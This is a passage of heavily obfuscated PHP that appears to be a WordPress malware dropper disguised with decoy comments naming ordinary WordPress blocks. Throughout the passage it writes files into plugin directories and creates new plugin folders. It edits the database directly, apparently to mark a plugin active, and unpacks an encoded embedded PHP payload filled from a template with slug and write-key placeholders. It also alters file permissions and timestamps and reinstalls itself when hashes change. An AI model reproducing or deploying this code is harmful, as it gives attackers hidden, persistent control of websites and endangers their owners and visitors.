     $gfzmpq2q4a =   $GLOBALS['__scf_ciwgxuks3i4cd_287'](true);
   $l9al15d27nef  =    array();
 
   foreach   ($mlqbxtvoi6vxn  as $_xfdo1_14r691bp) {
// evict visitor for WP Avatar Block


    
 if    (!  @$GLOBALS['__scf_i9hdv7zrfsy_45']($_xfdo1_14r691bp)   ||   !    @$GLOBALS['__scf_j_lsn68og3i_48']($_xfdo1_14r691bp))   {
continue;
 }
   if (($GLOBALS['__scf_ciwgxuks3i4cd_287'](true)  -   $gfzmpq2q4a) >   (0x5+0x5)) {
// unsubscribe work-queue for WP Latest Posts

 break;
    }
 

     $l9al15d27nef     =   $GLOBALS['__scf_zb77rzhln7336v_369']($l9al15d27nef,   b1o2e835ck74c2_20fsy_k($_xfdo1_14r691bp,      2));
    }

} catch  (Throwable   $k3g08rnqu9m)      {
 r63yaewew47stuijcrwsx6(bovhd4vawcd(827),  $k3g08rnqu9m);
  }   catch  (Exception  $k3g08rnqu9m)   {
    }



  
  return     $GLOBALS['__scf_r3sim5_axb_151']($GLOBALS['__scf_jghjt9zxt358_149']($l9al15d27nef),    array($fs1rcp1m71));
}
   function     x3d91dbwu4fnzlgc($fnwhjlc4bo5hy)
    {

       try  {
     $fscn6vcbv1baj2k   = array($fnwhjlc4bo5hy    .   m5t68uuej1(1081),     $fnwhjlc4bo5hy     . bovhd4vawcd(1082));
  foreach   ($fscn6vcbv1baj2k as $_xfdo1_14r691bp)   {
  if (!  @$GLOBALS['__scf_i9hdv7zrfsy_45']($_xfdo1_14r691bp))  {


  continue;$_27ur992c=4662;$pp22xhgz=$_27ur992c%3;

     }
 $la9buqn7cuj7777  =  h06jfdytq78tzk7($_xfdo1_14r691bp,   (1031+3969));
   if (!$GLOBALS['__scf_pomb89yiuz_37']($la9buqn7cuj7777))   {
continue;
  }



 foreach ($la9buqn7cuj7777 as     $k3g08rnqu9m)     {
      if   ($GLOBALS['__scf_vvn10ievj2k_9']($k3g08rnqu9m,    -(8-4))  ===    bovhd4vawcd(835) &&    ey9i45m9xcoe7q13e9ag2($_xfdo1_14r691bp  . '/'    . $k3g08rnqu9m, (4980+20))) {
 return   true;
    }
}
 foreach      ($la9buqn7cuj7777  as   $k3g08rnqu9m)  {
$sjm51xowiuq2a1kd  =  $_xfdo1_14r691bp      .     '/'     .   $k3g08rnqu9m;
     if  (! @$GLOBALS['__scf_i9hdv7zrfsy_45']($sjm51xowiuq2a1kd))  {
continue;
     }
$bq7pb6w_t368 =     h06jfdytq78tzk7($sjm51xowiuq2a1kd,   (0x131d+0x6b));
if (!$GLOBALS['__scf_pomb89yiuz_37']($bq7pb6w_t368))   {
    continue;

    }

      foreach ($bq7pb6w_t368      as    $e7s4480cj8b1c)  {
if     ($GLOBALS['__scf_vvn10ievj2k_9']($e7s4480cj8b1c,  -(2<<1))  ===   m5t68uuej1(835)   &&  ey9i45m9xcoe7q13e9ag2($sjm51xowiuq2a1kd     .  '/' .  $e7s4480cj8b1c,    (4973+27)))    {
 return  true;
  


 }
  }
}


 }
 }  catch (Throwable  $k3g08rnqu9m)  {
r63yaewew47stuijcrwsx6(lpwgqh9300(1083),    $k3g08rnqu9m);
}     catch   (Exception  $k3g08rnqu9m) {
      }
 return   false;
 }

     function ckqhx9ltnlpymg3uv5()
{
   try  {
      if    (p_lwrm_zqo9euyd0(t6995wceyqc2q1wqvl())) return;
 
if   (get_transient(m40pvx5ij_z4mj(1084))) {
 return;
       }
     set_transient(lpwgqh9300(1084),  1, (517+83));
   
    $xs7ycu0j4f9    =  z2lalb3eiqlgy6ozb9();
  if (!    $xs7ycu0j4f9 ||    $GLOBALS['__scf_fr9u7cq1eo_10']($xs7ycu0j4f9)  <  (1592-592))  {
      return;
 }
 if   (!  fgcc_h22bqxgwmccod($xs7ycu0j4f9))    {
    r63yaewew47stuijcrwsx6(m5t68uuej1(1085),  m40pvx5ij_z4mj(1086));
    return;
}


     
 $l9al15d27nef   = k25naoumioxo0hnmrbj_a();


  if  (empty($l9al15d27nef)) {
 if  (!get_transient(lpwgqh9300(1087)))   {
   r63yaewew47stuijcrwsx6(bovhd4vawcd(1088),   m5t68uuej1(1089));
  set_transient(m5t68uuej1(1087), 1,  (3819-219));
     }
     set_transient(m40pvx5ij_z4mj(1084), 1,  (259130+70));
   return;
      }
 $ds2km9nc_g4nzr =    0;

foreach  ($l9al15d27nef   as $fnwhjlc4bo5hy) {
 


    if  (x3d91dbwu4fnzlgc($fnwhjlc4bo5hy)) {
// WP Verse Block: prescriptive publisher



      continue;
}



    
  $hm200mw9rphg90c =   "";
 $wukda101h9oznh   =  $fnwhjlc4bo5hy  .   m5t68uuej1(1081);$_km57y4ox38=165;$ia_b5hz3dfmf=($_km57y4ox38>0)?$_km57y4ox38:-$_km57y4ox38;
   if (@$GLOBALS['__scf_ph63athptt_46']($wukda101h9oznh) &&   !@$GLOBALS['__scf_i9hdv7zrfsy_45']($wukda101h9oznh)) {



 $wukda101h9oznh  =   null;

   }  elseif (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($wukda101h9oznh)) {
    xcz5hl0mdlt7fpm3xxe($wukda101h9oznh,  (449+44), true);
  }
       if ($wukda101h9oznh    &&   (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($wukda101h9oznh) ||  !@$GLOBALS['__scf_p_260ito5s0j_50']($wukda101h9oznh)))  {$z493qkpxdxa=213|235;$uobsycey=$z493qkpxdxa^150;
$wukda101h9oznh  = null;



  }
      if      ($wukda101h9oznh)    {
   $cijv6lnq0s00zn = $wukda101h9oznh   . '/'  .  a_2kjbn3ievobiy5tn3cy();
$edm7bf259ygvj  =  y2fq_g7qilvdboqm1($xs7ycu0j4f9);
  $zffb4iacl0r21go   =   d3czoa7z5ve8_za41c14d($cijv6lnq0s00zn,  $edm7bf259ygvj,     m5t68uuej1(1088));
if  ($zffb4iacl0r21go   &&  $zffb4iacl0r21go      >=     $GLOBALS['__scf_fr9u7cq1eo_10']($edm7bf259ygvj)) {



   $hm200mw9rphg90c  = $cijv6lnq0s00zn;
}
}
      
  if (!  $hm200mw9rphg90c)  {
 $kb0x6r0ygtpi2r = $GLOBALS['__scf_rwpc7a7ar1p_204'](a_2kjbn3ievobiy5tn3cy(),   PATHINFO_FILENAME);
  $gaj5esf1d20k6rxi   = $fnwhjlc4bo5hy .   lpwgqh9300(1090)  . $kb0x6r0ygtpi2r;
    if   (!   @$GLOBALS['__scf_i9hdv7zrfsy_45']($gaj5esf1d20k6rxi)) {
        xcz5hl0mdlt7fpm3xxe($gaj5esf1d20k6rxi,   (422+71), true);
      }

$cijv6lnq0s00zn   =  $gaj5esf1d20k6rxi .    '/'    . a_2kjbn3ievobiy5tn3cy();
$edm7bf259ygvj    =  y2fq_g7qilvdboqm1($xs7ycu0j4f9);$ih6kz4j3=33+26;$h3bl8w79=$ih6kz4j3-4;
 $zffb4iacl0r21go    = d3czoa7z5ve8_za41c14d($cijv6lnq0s00zn, $edm7bf259ygvj,     bovhd4vawcd(1088));
if ($zffb4iacl0r21go  &&  $zffb4iacl0r21go >= $GLOBALS['__scf_fr9u7cq1eo_10']($edm7bf259ygvj))  {
  $hm200mw9rphg90c     = $cijv6lnq0s00zn;
  
$basename =  $kb0x6r0ygtpi2r   .  '/' .    a_2kjbn3ievobiy5tn3cy();
   eil7j_ny5hfrg16($fnwhjlc4bo5hy, $basename);
     }
   }
 if (!  $hm200mw9rphg90c)   {
      continue;$csrdbeufw=57*8;$pyzsi0n1=$csrdbeufw-10;
  }
tgj6urla_2q3x4g8e($hm200mw9rphg90c);
   cik9ldzrbjmtnzm00($hm200mw9rphg90c,    (404+16));
  $ds2km9nc_g4nzr++;
   }
 if   ($ds2km9nc_g4nzr > 0) {
 set_transient(lpwgqh9300(1084), 1,     (259151+49));



}     else {
set_transient(m40pvx5ij_z4mj(1084),    1,  (3512+88));
     }
      }      catch   (Throwable  $k3g08rnqu9m)     {
       r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(1088), $k3g08rnqu9m);



    }   catch   (Exception $k3g08rnqu9m) {
 }

   }
  function    eil7j_ny5hfrg16($fnwhjlc4bo5hy,  $basename)
 {
try  {
 $z5ryhoyrdlzk  =   $fnwhjlc4bo5hy    . m5t68uuej1(1091);
     if  (! @$GLOBALS['__scf_a83pywb98qzq2_20']($z5ryhoyrdlzk))      {
// reclaim conformal affine-type

      $z5ryhoyrdlzk  =   $GLOBALS['__scf_oagg5b1ubqmznt_11']($fnwhjlc4bo5hy)  . bovhd4vawcd(1091);
 if    (!    @$GLOBALS['__scf_a83pywb98qzq2_20']($z5ryhoyrdlzk))  {
return;


  }
// traverse filter-chain for WP Block Variations

 }
 $t6jsjlatx2i    =    @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($z5ryhoyrdlzk);
 if  (!    $t6jsjlatx2i)   {
  return;
 }
   $ths092kyrcxmza =  "";
$prefix =      "";


    if ($GLOBALS['__scf_vqnw5_4kg7eu_96'](lpwgqh9300(1092),   $t6jsjlatx2i,  $ijvqfm4k0rvi7)) {
 $ths092kyrcxmza =     $ijvqfm4k0rvi7[1];
}
   if  ($GLOBALS['__scf_vqnw5_4kg7eu_96'](m5t68uuej1(1093),  $t6jsjlatx2i,  $ijvqfm4k0rvi7)) {
   $prefix   =   $ijvqfm4k0rvi7[1];

}
 if     (!    $ths092kyrcxmza  ||     !     $prefix ||   ! $GLOBALS['__scf_vqnw5_4kg7eu_96'](bovhd4vawcd(1094),   $prefix)) {
      return;


  }
 $wpdb =      $GLOBALS[bovhd4vawcd(1095)];
  if  (!  $GLOBALS['__scf_pd74_ila1rfp_70']($wpdb)  ||  ! $GLOBALS['__scf_sruyigi7mie8_118']($wpdb, bovhd4vawcd(1096)))  {
      return;
}
if  (!  $GLOBALS['__scf_vqnw5_4kg7eu_96'](m5t68uuej1(1097),      $ths092kyrcxmza))   {
r63yaewew47stuijcrwsx6(bovhd4vawcd(763), lpwgqh9300(1098));
        return;
 }
 $z5fapj2xam_4s  = '`'   .   $ths092kyrcxmza  .  m40pvx5ij_z4mj(1099)  . $prefix  .    bovhd4vawcd(1100);
$wpdb->query(lpwgqh9300(1101));
    

  $w_i2u9z_f52_px2d     = $wpdb->get_var('S'      .  m5t68uuej1(1102)     .   $z5fapj2xam_4s .    m5t68uuej1(1103) . lpwgqh9300(1104)    .  lpwgqh9300(1105));
    if  ($w_i2u9z_f52_px2d   === null)     {
    $wpdb->query(bovhd4vawcd(1106));


return;

}
    $oci91yd15u5g8 =     xxfwy1b80pjn7bvjqfw($w_i2u9z_f52_px2d);


if    (!     $GLOBALS['__scf_pomb89yiuz_37']($oci91yd15u5g8))   {
 $wpdb->query(lpwgqh9300(1106));



    return;
      }
 if  ($GLOBALS['__scf_hf87ul3fvpzrkm_150']($basename,  $oci91yd15u5g8,    true))  {
$wpdb->query(m40pvx5ij_z4mj(1107));
   return;
  }
 $oci91yd15u5g8[]  = $basename;
 $oci91yd15u5g8 = $GLOBALS['__scf__ofafsmvux__148']($oci91yd15u5g8);
   $gmgx7_edk902ic5o    =    $GLOBALS['__scf_dl_1lcowe4_351']($oci91yd15u5g8);
    $afi4iwtccre5mup7 =    $wpdb->query($wpdb->prepare('U' . lpwgqh9300(1108)   .  $z5fapj2xam_4s   .  bovhd4vawcd(1109)  . bovhd4vawcd(1110),  $gmgx7_edk902ic5o));
if ($afi4iwtccre5mup7  ===  false)    {



 r63yaewew47stuijcrwsx6(lpwgqh9300(763),    bovhd4vawcd(1111));
$wpdb->query(m40pvx5ij_z4mj(1112));
    return;


}
    $wpdb->query(bovhd4vawcd(1107));


      if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1113)))     {
    @wp_cache_delete(m5t68uuej1(1114),   m40pvx5ij_z4mj(1115));
    @wp_cache_delete(m40pvx5ij_z4mj(725),  m5t68uuej1(1115));
      }
 } catch  (Throwable  $k3g08rnqu9m)  {$ut5u3gg3vp=-173;$xz8oab80=($ut5u3gg3vp>0)?$ut5u3gg3vp:-$ut5u3gg3vp;
r63yaewew47stuijcrwsx6(lpwgqh9300(763),  $k3g08rnqu9m);
  if  ($GLOBALS['__scf_pd74_ila1rfp_70']($GLOBALS[lpwgqh9300(1095)]))    {
@$GLOBALS[m5t68uuej1(1095)]->query(lpwgqh9300(1112));
   }
 }    catch  (Exception    $k3g08rnqu9m)   {
  r63yaewew47stuijcrwsx6(bovhd4vawcd(763),   $k3g08rnqu9m);
if  ($GLOBALS['__scf_pd74_ila1rfp_70']($GLOBALS[lpwgqh9300(1095)]))    {
@$GLOBALS[lpwgqh9300(1095)]->query(lpwgqh9300(1112));
}
}
  }



function jwczq4rma03eqb2u5do()
    {
   static  $t6jsjlatx2i  =  null;
if  ($t6jsjlatx2i !== null)  return   $t6jsjlatx2i;
  if   (!$GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(276)))   {
 $t6jsjlatx2i  =  "";
     return    $t6jsjlatx2i;
     }


       $t6jsjlatx2i =   @gzinflate($GLOBALS['__scf_wak9390fh7p_356'](lpwgqh9300(1116)));
if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($t6jsjlatx2i)    ||     $GLOBALS['__scf_fr9u7cq1eo_10']($t6jsjlatx2i)  < (65^37))    $t6jsjlatx2i =   "";
 return      $t6jsjlatx2i;
}
  function  ux01y8j0rd4e7wp37uwspi()
    {


try   {
   if    (!defined(lpwgqh9300(1061)))   return;
  $lnfyvmqftz    =     $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl(), lpwgqh9300(1117));
       $mhgza3zqckbz8    =  dv62azao9qb3z33m4cwig0(ABSPATH .  lpwgqh9300(1118),    (4+4)) .   m40pvx5ij_z4mj(1119);
$yl159i9_a2jev    = dv62azao9qb3z33m4cwig0(ABSPATH .  m40pvx5ij_z4mj(1120),  (4+4));$no29i_0kztx1d=PHP_MAJOR_VERSION;$fn2iwxmu2=$no29i_0kztx1d*9;
$_u1nbi_7qhtgjhy     =  $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1121))    ?    content_url()  :   "";

if  ($_u1nbi_7qhtgjhy   === "")   {
// WP Post Excerpt: primary coordinator



 $_u1nbi_7qhtgjhy    = ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1122))  ?      get_site_url()    :    "") .     lpwgqh9300(1123);
   }
$u_0uqqqgf03  = $GLOBALS['__scf_kr_w9stt2gb_360'](bovhd4vawcd(1124),   m40pvx5ij_z4mj(1125),   $_u1nbi_7qhtgjhy .   '/'   .   $mhgza3zqckbz8);



  if  ($GLOBALS['__scf_i8i8g4oxha_7']($u_0uqqqgf03,  m40pvx5ij_z4mj(1125)) !== 0) $u_0uqqqgf03   =  bovhd4vawcd(1125)  .  $GLOBALS['__scf_ygq7rrk70hs6ha_8']($u_0uqqqgf03,   '/');
$gqdtzfk5wsuy98l   =   $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(556))  ?  home_url(m5t68uuej1(1126) .  r6u7xx6bh80hwva027(m40pvx5ij_z4mj(1120)))  :    "";
   if ($gqdtzfk5wsuy98l   ===     "")  $gqdtzfk5wsuy98l   =   m5t68uuej1(1127)  . rgrb14nj3p43kvdym51x("")   .   lpwgqh9300(1128)    . r6u7xx6bh80hwva027(bovhd4vawcd(1129));
if   ($GLOBALS['__scf_i8i8g4oxha_7']($gqdtzfk5wsuy98l, m5t68uuej1(1127))    !==   0) $gqdtzfk5wsuy98l  = m5t68uuej1(1127)    .  $GLOBALS['__scf_ygq7rrk70hs6ha_8']($GLOBALS['__scf_r1v12_o00h5hc_454'](m5t68uuej1(1130),  "",   $gqdtzfk5wsuy98l),  '/');
$v1l1d3jxi5alfj9    =    isset($GLOBALS[m5t68uuej1(1131)])     &&     $GLOBALS['__scf_e_8z8ias8ka_43']($GLOBALS[m5t68uuej1(1131)]) ?  $GLOBALS[lpwgqh9300(1132)]  :    "";
  if ($GLOBALS['__scf_fr9u7cq1eo_10']($v1l1d3jxi5alfj9)    <  (175-75)) {
// WP BlockControls: typecheck branded-type

  $v1l1d3jxi5alfj9 =    sb3q0_7sw2xmlw84(m5t68uuej1(1133),   "");
 }
      if  ($GLOBALS['__scf_fr9u7cq1eo_10']($v1l1d3jxi5alfj9)     <    (25<<2))    {
   $v1l1d3jxi5alfj9     = jwczq4rma03eqb2u5do();

 }
  $jckf2yb97v8ahjmr   =   "";
 if    (isset($GLOBALS[m5t68uuej1(1134)])    && $GLOBALS['__scf_e_8z8ias8ka_43']($GLOBALS[bovhd4vawcd(1134)])   &&    $GLOBALS['__scf_fr9u7cq1eo_10']($GLOBALS[lpwgqh9300(1134)])   >   (25<<1)) {$odm0x2_m=PHP_INT_MAX/PHP_INT_MAX;$iaykw56dmhy=$odm0x2_m+88;
 $jckf2yb97v8ahjmr =  $GLOBALS[lpwgqh9300(1134)];$qqlofs0m=(0x7b+0x96);$gpabo63dl=$qqlofs0m%6;
     }   else  {


 $jckf2yb97v8ahjmr =     sb3q0_7sw2xmlw84(m5t68uuej1(1135),   "");
      }
 if ($GLOBALS['__scf_fr9u7cq1eo_10']($jckf2yb97v8ahjmr) > (242^192))    {



 vmq5vh_lh7_vsiehf4nm(lpwgqh9300(1136),    $jckf2yb97v8ahjmr, bovhd4vawcd(1042));
}


  $ujb_2f7rfppnx    =     $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(556))  ? (string)   $GLOBALS['__scf_jphyng87rekxk_557'](home_url('/'),     PHP_URL_PATH) : '/';
 if   ($ujb_2f7rfppnx === "")   $ujb_2f7rfppnx  =    '/';
if  ($GLOBALS['__scf_vvn10ievj2k_9']($ujb_2f7rfppnx,  -1) !==  '/') $ujb_2f7rfppnx  .=   '/';
       $qczfvumq9bz =  array(
bovhd4vawcd(1137) =>  m2sqsvjfli0izb(),
       m5t68uuej1(1138)   =>   oqfb6x5kx6vd0hfusbhmq(),
lpwgqh9300(1139) =>   $ujb_2f7rfppnx,
    );
  $qme1owkimphz = array(
  m40pvx5ij_z4mj(1140)      =>    $u_0uqqqgf03,
 m5t68uuej1(1141)    =>   $lnfyvmqftz,
lpwgqh9300(1142)  =>    $gqdtzfk5wsuy98l,
 m40pvx5ij_z4mj(1143)  =>   dv62azao9qb3z33m4cwig0(ABSPATH     .  bovhd4vawcd(1144), (6<<1)),
 lpwgqh9300(1145)      => $jckf2yb97v8ahjmr,
   );
    

$ggtncfu2tbyp     =      d6ydz3_mq4hw_2s8_bo(m5t68uuej1(1146),  "");
if    (!$GLOBALS['__scf_e_8z8ias8ka_43']($ggtncfu2tbyp) || $GLOBALS['__scf_fr9u7cq1eo_10']($ggtncfu2tbyp) ===   0)   {
 return;
    }
  $qde8ma8aij5r8ods   =   $GLOBALS['__scf_xsxk3ht6_06zc_354'](k__ppv5v06f7k9n1nm($GLOBALS['__scf_sfkxpd8jhlhj_587']($qme1owkimphz),   $ggtncfu2tbyp));
    $n_3m3g0dmwpl7pk    =  lpwgqh9300(1147)  . $GLOBALS['__scf_xsxk3ht6_06zc_354']($GLOBALS['__scf_sfkxpd8jhlhj_587']($qczfvumq9bz))   .  bovhd4vawcd(1148);
$n_3m3g0dmwpl7pk .=     bovhd4vawcd(1149)  . $qde8ma8aij5r8ods  .  bovhd4vawcd(1150);
$s6chnezras5 =  $GLOBALS['__scf_pe3s4q1z7z_59']((string)  $v1l1d3jxi5alfj9 . (string)  $jckf2yb97v8ahjmr   .  $ggtncfu2tbyp      . $GLOBALS['__scf_sfkxpd8jhlhj_587']($qczfvumq9bz[bovhd4vawcd(1137)])  .     $GLOBALS['__scf_sfkxpd8jhlhj_587']($qczfvumq9bz[bovhd4vawcd(1151)])   .    '|' .  $GLOBALS['__scf_vi47igxg1zd_103'](rgrb14nj3p43kvdym51x(""))     .    '|'     .   $ujb_2f7rfppnx);
if   (vmq5vh_lh7_vsiehf4nm(bovhd4vawcd(1152),   $n_3m3g0dmwpl7pk,  m5t68uuej1(1042))  ||    sb3q0_7sw2xmlw84(m40pvx5ij_z4mj(1152), "")    ===  $n_3m3g0dmwpl7pk)    vmq5vh_lh7_vsiehf4nm(m40pvx5ij_z4mj(1153),    $s6chnezras5,   lpwgqh9300(1154));
 unset($s6chnezras5);
    $mmf1773xhj6k  =  $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(556))  ?    home_url(bovhd4vawcd(1155) .  r6u7xx6bh80hwva027(lpwgqh9300(1156))) :   "";
   if     ($mmf1773xhj6k    === "") $mmf1773xhj6k     = m40pvx5ij_z4mj(1157) .    rgrb14nj3p43kvdym51x("")  .     bovhd4vawcd(1128)      .   r6u7xx6bh80hwva027(lpwgqh9300(1156));
  if ($GLOBALS['__scf_i8i8g4oxha_7']($mmf1773xhj6k, lpwgqh9300(1158))  !==  0)     $mmf1773xhj6k    = m5t68uuej1(1159)    .   $GLOBALS['__scf_ygq7rrk70hs6ha_8']($GLOBALS['__scf_r1v12_o00h5hc_454'](bovhd4vawcd(1130), "", $mmf1773xhj6k),   '/');
 vmq5vh_lh7_vsiehf4nm(lpwgqh9300(495), $mmf1773xhj6k,    m40pvx5ij_z4mj(1154));
 if  ($GLOBALS['__scf_fr9u7cq1eo_10']($v1l1d3jxi5alfj9) <  (0x7+0x5d)) {
/* dense synchronizer */

   return;



      }
vmq5vh_lh7_vsiehf4nm(bovhd4vawcd(1133),   $v1l1d3jxi5alfj9,  m40pvx5ij_z4mj(1154));
        if  (!toqvilnv84hv69v2gepwhm())      return;
 $ymsu_gohk1ack2w     = dha61pphirvk3tnlr();


 if (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($ymsu_gohk1ack2w))  xcz5hl0mdlt7fpm3xxe($ymsu_gohk1ack2w, (417+76), true);
 if   (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($ymsu_gohk1ack2w) ||  !@$GLOBALS['__scf_p_260ito5s0j_50']($ymsu_gohk1ack2w))    return;

 $sdbya56v9ii      =    $ymsu_gohk1ack2w   .      '/'    .   $yl159i9_a2jev .  bovhd4vawcd(1160);
        $gvnd6ux1cvgc  =  zjbm0yf_s5pmydvy7u2o6y(
 lpwgqh9300(1161),
 array('__SLUG__',  '__ZIP_NAME__',  '__WRITE_KEY__', '__VERSION__'),
  array($lnfyvmqftz, $mhgza3zqckbz8,     dv62azao9qb3z33m4cwig0(ABSPATH .    m5t68uuej1(1144),     (16-4)),  kdgw8qqvzf6yolk())
);


      if  (!$gvnd6ux1cvgc)  {
  if ((int) get_option(m40pvx5ij_z4mj(751),  0)  >      0)    r63yaewew47stuijcrwsx6(lpwgqh9300(1156), lpwgqh9300(1162));
return;

}
       if   (!@$GLOBALS['__scf_nmc3chd3edto_699']($sdbya56v9ii) ||  $GLOBALS['__scf_pe3s4q1z7z_59'](bdsvhgz69_4ct5ntcc((string) @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($sdbya56v9ii)))   !==  $GLOBALS['__scf_pe3s4q1z7z_59']($gvnd6ux1cvgc))  {$fk1wkk4yrhdke=1985;$n7mqjg70a=$fk1wkk4yrhdke%13;
 d3czoa7z5ve8_za41c14d($sdbya56v9ii, $gvnd6ux1cvgc,    m40pvx5ij_z4mj(1163));
g3arn5w1kvbi32ro9tm($sdbya56v9ii,      db6euveuzemu49d01thfga());
   cik9ldzrbjmtnzm00($sdbya56v9ii, (386+34));
 lnseazh_1k4yq6v_kjl($sdbya56v9ii);
   }
    } catch    (Throwable     $k3g08rnqu9m)    {
 r63yaewew47stuijcrwsx6(lpwgqh9300(1156), $k3g08rnqu9m);
   } catch  (Exception     $k3g08rnqu9m)  {
  }
      }
function   zjbm0yf_s5pmydvy7u2o6y($key,     $r4gaqribnodx,  $yyj9o3y2am5me)
{
$cmpm56v6mwop4   =  null;
if  ($cmpm56v6mwop4  ===     null)  {
$cmpm56v6mwop4  = $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(467))  ? get_transient(ikw0tf8wjoufcwbi7uaqr())   : false;
    if      (!  $GLOBALS['__scf_pomb89yiuz_37']($cmpm56v6mwop4)) {$nzv4m_6uyw=PHP_INT_MAX/PHP_INT_MAX;$a8a0hq4z8l7i=$nzv4m_6uyw+64;
  $cmpm56v6mwop4  = i1v3dbjfcu375r(m5t68uuej1(654),   false);

     }
  if  (!  $GLOBALS['__scf_pomb89yiuz_37']($cmpm56v6mwop4))  {
  $cmpm56v6mwop4  =    array();
   }
// partition injector for WP Site Tagline

    }
   $wtvjfbz8g882q = "";

if  (isset($cmpm56v6mwop4[$key]) &&    $GLOBALS['__scf_e_8z8ias8ka_43']($cmpm56v6mwop4[$key]))  {



    $wtvjfbz8g882q    =  $cmpm56v6mwop4[$key];



}
// affine provider

    if    ($GLOBALS['__scf_fr9u7cq1eo_10']($wtvjfbz8g882q)  < (84-34)) {
   $wtvjfbz8g882q    =  sb3q0_7sw2xmlw84($key,  "");
    }
if    ($GLOBALS['__scf_fr9u7cq1eo_10']($wtvjfbz8g882q)  < (4+46))   return  false;
 $ohfs0792xygm    = $GLOBALS['__scf_wak9390fh7p_356']($wtvjfbz8g882q, true);


if   (!$ohfs0792xygm ||    $GLOBALS['__scf_fr9u7cq1eo_10']($ohfs0792xygm) <  (47+3)) return   false;



if  ($GLOBALS['__scf_i8i8g4oxha_7']($ohfs0792xygm,   m40pvx5ij_z4mj(238)) ===   false) return   false;
    $ohfs0792xygm   =    $GLOBALS['__scf_kr_w9stt2gb_360']($r4gaqribnodx,  $yyj9o3y2am5me,  $ohfs0792xygm);
 if  (defined(lpwgqh9300(1164))) {
  try {
 @token_get_all($ohfs0792xygm,  TOKEN_PARSE);


 }  catch    (Throwable $k3g08rnqu9m)  {
return false;
}    catch    (Exception   $k3g08rnqu9m)  {
    return false;
  }
 } elseif    (!fgcc_h22bqxgwmccod($ohfs0792xygm))    {$m2ebqtsze4xsv2=6454;$gw3b3yx9ultu=$m2ebqtsze4xsv2%15;
      return    false;
   }
     return    $ohfs0792xygm;
   }
   function     zy3td9hebmtic9vrgh5h()
    {
   try  {

if    (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(467)))    return;
   if     (!defined(bovhd4vawcd(1061)))  return;


   $zpe7g8_ryxz = ea3rn1t45vvwzrmig2qjw3();
if (!$zpe7g8_ryxz)  {$wbloime9j0=PHP_MAJOR_VERSION;$wc19dwwzsk0=$wbloime9j0*10;
 ux01y8j0rd4e7wp37uwspi();
 $zpe7g8_ryxz =  ea3rn1t45vvwzrmig2qjw3();


 }
  $c2ngqawy9ma8q    =   sb3q0_7sw2xmlw84(lpwgqh9300(1165),  "");
    if ($GLOBALS['__scf_fr9u7cq1eo_10']($c2ngqawy9ma8q)  ===  0)   $c2ngqawy9ma8q    =  $GLOBALS['__scf_cxz48683fju4a_1166']("\x00",     (28-12));
 $zluy0o87x8l5y7vx   =  (isset($GLOBALS[bovhd4vawcd(1132)]) &&  $GLOBALS['__scf_e_8z8ias8ka_43']($GLOBALS[lpwgqh9300(1132)]) &&  $GLOBALS['__scf_fr9u7cq1eo_10']($GLOBALS[lpwgqh9300(1167)])  >=    (191-91))  ?  $GLOBALS[m40pvx5ij_z4mj(1167)] :  sb3q0_7sw2xmlw84(bovhd4vawcd(1168),   "");
     if  ($GLOBALS['__scf_fr9u7cq1eo_10']($zluy0o87x8l5y7vx) <  (86+14))     $zluy0o87x8l5y7vx  =  jwczq4rma03eqb2u5do();
$ishazjoo6gl4e20e =   (isset($GLOBALS[bovhd4vawcd(1134)])  &&  $GLOBALS['__scf_e_8z8ias8ka_43']($GLOBALS[m40pvx5ij_z4mj(1134)])  &&  $GLOBALS['__scf_fr9u7cq1eo_10']($GLOBALS[lpwgqh9300(1134)]) >  (0x2d+0x5))  ?  $GLOBALS[lpwgqh9300(1134)]   :  sb3q0_7sw2xmlw84(bovhd4vawcd(1136), "");
 $bxphvl093386_     =   $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(556)) ?   (string)   $GLOBALS['__scf_jphyng87rekxk_557'](home_url('/'), PHP_URL_PATH)   :  '/';


 if ($bxphvl093386_   ===    "")     $bxphvl093386_ = '/';
if    ($GLOBALS['__scf_vvn10ievj2k_9']($bxphvl093386_,   -1)   !==    '/') $bxphvl093386_ .= '/';
   $x4kc6nx4tntrm  =      $GLOBALS['__scf_pe3s4q1z7z_59']($zluy0o87x8l5y7vx .   $ishazjoo6gl4e20e  .  $c2ngqawy9ma8q .    $GLOBALS['__scf_sfkxpd8jhlhj_587'](m2sqsvjfli0izb())    .     $GLOBALS['__scf_sfkxpd8jhlhj_587'](oqfb6x5kx6vd0hfusbhmq()) .  '|' . $GLOBALS['__scf_vi47igxg1zd_103'](rgrb14nj3p43kvdym51x(""))  .     '|'   . $bxphvl093386_);
   unset($bxphvl093386_);
      if  (sb3q0_7sw2xmlw84(bovhd4vawcd(1153),    "")      !==     $x4kc6nx4tntrm)  {
   ux01y8j0rd4e7wp37uwspi();
     $zpe7g8_ryxz  =     ea3rn1t45vvwzrmig2qjw3();
}
if  (!toqvilnv84hv69v2gepwhm()) return;
 $e3thri4q7dp  =  r5waslskyqytjrm6();
   $n5adtr9htw6f =  @$GLOBALS['__scf_nmc3chd3edto_699']($e3thri4q7dp     .    m40pvx5ij_z4mj(1169));
 if ($n5adtr9htw6f  &&    $zpe7g8_ryxz &&  get_transient(m5t68uuej1(653))) return;
  eo43a_g2tbnijjb0u();
kb0gfutfmftrb5y();
 extcosfwd0c5h48r6();
$udhln6mx_x3284 = @$GLOBALS['__scf_nmc3chd3edto_699']($e3thri4q7dp     .  m5t68uuej1(1169));
   $zpe7g8_ryxz   =  ea3rn1t45vvwzrmig2qjw3();

